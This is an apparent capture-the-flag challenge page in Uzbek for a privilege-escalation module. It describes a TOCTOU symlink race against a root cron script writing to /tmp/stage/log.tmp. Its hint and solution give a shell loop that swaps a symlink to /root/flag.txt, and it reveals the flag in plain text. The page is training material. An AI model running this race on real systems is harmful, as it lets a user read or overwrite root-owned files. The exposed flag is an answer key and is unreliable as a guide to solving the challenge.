---
id: 20
title: "CH20: TOCTOU Symlink Race Condition in Root Script"
module: "Modul 2: PrivEsc & Binary Exploitation"
difficulty: Hard
points: 10
tags: ['toctou', 'race-condition', 'symlinks', 'privesc']
flag: "HD{toctou_symlink_race_condition_root_920}"
---

# 🎯 Topshiriq #20: CH20: TOCTOU Symlink Race Condition in Root Script

## 📌 Metama'lumotlar:
* **Modul:** `Modul 2: PrivEsc & Binary Exploitation`
* **Qiyinlik darajasi:** `🔴 Hard`
* **Maksimal Ball:** `⭐ 10 ball`
* **Teglar:** #toctou, #race-condition, #symlinks, #privesc

---

## 📝 Topshiriq Senariysi (Scenario):
Root cron skripti '/tmp/stage/log.tmp' faylini tekshirib, 0.1 soniyadan keyin unga ma'lumot yozadi. Inotify va symlink poygasi (Race condition) orqali '/root/flag.txt' ni o'zgartiring yoki o'qing.

---

## 💡 Kichik Maslahat (Hint):
> [!TIP]
> while true; do ln -sf /root/flag.txt /tmp/stage/log.tmp; ln -sf /tmp/dummy /tmp/stage/log.tmp; done

---

## 🛠️ Professional Yechim Ko'rsatmasi:
```bash
# Topshiriqni yechish bo'yicha ko'rsatma:
while true; do ln -sf /root/flag.txt /tmp/stage/log.tmp; ln -sf /tmp/dummy /tmp/stage/log.tmp; done
```

---

## 🚩 Maxfiy Flag:
`HD{toctou_symlink_race_condition_root_920}`
